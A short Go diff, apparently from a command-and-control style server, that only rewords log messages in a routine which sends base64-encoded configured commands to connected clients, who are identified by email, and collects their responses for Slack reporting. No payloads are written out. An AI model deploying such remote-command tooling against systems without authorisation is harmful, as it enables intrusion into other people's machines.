@@ -152,7 +152,7 @@ func handleClient(conn net.Conn, id string) {
 	logger := log.New(file, "", log.LstdFlags)
 	logger.Println("FILE BEGINS HERE.")
 	logger.Println("Client Email: ", id)
-	logger.Println("Client IP: ", conn.RemoteAddr())
+	logger.Println("Client IP: ", conn.RemoteAddr().String())
 	data := runAttackSequence(conn, logger)
 	disconnectClient(conn, logger, *file)
 	//err = n.SendEmail(conn, SERVCONFIG.EMAILEN, SERVCONFIG.NOTEMAIL, servlog)
@@ -207,7 +207,7 @@ func runAttackSequence(conn net.Conn, logger *log.Logger) []t.SlackSchemaOne {
 	for _, element := range SERVCONFIG.CMDSTORUN {
 		element = strings.TrimSpace(element)
 		encodedStr := base64.StdEncoding.EncodeToString([]byte(element))
-		logger.Println("EXECUTE: " + element)
+		logger.Println("REMOTELY EXECUTING: " + element)
 		setWriteDeadLine(conn)
 		_, err := conn.Write([]byte(encodedStr))
 		if err != nil {
@@ -220,7 +220,7 @@ func runAttackSequence(conn net.Conn, logger *log.Logger) []t.SlackSchemaOne {
 			return nil
 		}
 		decodedStr, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
-		logger.Println("RES: " + string(decodedStr[:]))
+		logger.Println("RESPONSE RECEIVED: " + string(decodedStr[:]))
 		data = append(data, t.SlackSchemaOne{Type: "context", Elements: []t.SlackSchemaTwo{{
 			Type: "mrkdwn",
 			Text: "CMD: " + element,
